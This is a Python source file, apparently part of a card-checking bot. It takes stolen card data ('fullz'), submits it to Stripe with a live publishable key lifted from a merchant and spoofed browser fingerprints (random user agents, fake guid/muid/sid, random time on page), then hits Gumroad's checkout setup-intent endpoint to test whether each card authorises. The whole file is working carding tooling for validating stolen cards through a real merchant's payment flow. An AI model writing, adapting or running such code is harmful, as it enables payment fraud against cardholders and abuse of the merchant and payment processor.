import random
import uuid
from fake_useragent import UserAgent
from FUNC.usersdb_func import *
from FUNC.defs import *



async def create_auth(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")

        url     = "https://api.stripe.com/v1/payment_methods"
        headers = {
            "authority": "api.stripe.com",
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": UserAgent().random,
        }
        data = {
            "type": "card",
            "billing_details[address][postal_code]": "10080",
            "card[number]": cc ,
            "card[cvc]": cvv ,
            "card[exp_month]": mes ,
            "card[exp_year]": ano ,
            "guid": str(uuid.uuid4()),
            "muid": str(uuid.uuid4()),
            "sid": str(uuid.uuid4()),
            "payment_user_agent": "stripe.js/3481fca2ed; stripe-js-v3/3481fca2ed; card-element",
            "time_on_page": str(random.randint(10000, 99999)),
            "key": "pk_live_Db80xIzLPWhKo1byPrnERmym",
            "_stripe_version": "2020-08-27",
        }
        result = await session.post(url, headers=headers, data=data)
        try:
            payment_method_id = result.json()["id"]
        except:
            return result
        
        url     = "https://app.gumroad.com/stripe/setup_intents"
        headers = {
            'authority': 'app.gumroad.com',
            'accept': 'application/json, text/html',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://app.gumroad.com',
            'referer': 'https://app.gumroad.com/checkout',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': UserAgent().random,
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'status': 'success',
            'type': 'card',
            'reusable': 'false',
            'stripe_payment_method_id': payment_method_id,
            'card_country': 'US',
            'card_country_source': 'stripe',
            'permalink': '',
        }
        result = await session.post(url = url , headers = headers , data = data)
        return result

    except Exception as e:
        return str(e)
